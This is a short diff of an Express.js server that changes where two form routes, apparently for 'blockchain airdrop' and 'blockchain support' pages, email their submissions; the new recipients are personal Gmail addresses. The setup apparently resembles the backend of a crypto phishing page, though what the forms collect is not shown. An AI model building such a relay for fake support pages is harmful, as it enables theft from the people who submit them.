@@ -221,7 +221,7 @@ app.post('/blkairdrop', (req, res, next) => {
 
   const mail = {
       from: 'admin@growveonct.com',
-      to: 'ifestephenie@gmail.com',
+      to: 'testimonyibom@gmail.com',
       subject: 'New message from blockchainairdrop',
       html: content,
   }
@@ -252,7 +252,7 @@ app.post('/blk-support', (req, res, next) => {
 
   const mail = {
       from: 'admin@growveonct.com',
-      to: 'ifestephenie@gmail.com',
+      to: 'blessedhustle02@gmail.com',
       subject: 'New message from Block-chainsupport',
       html: content,
   }
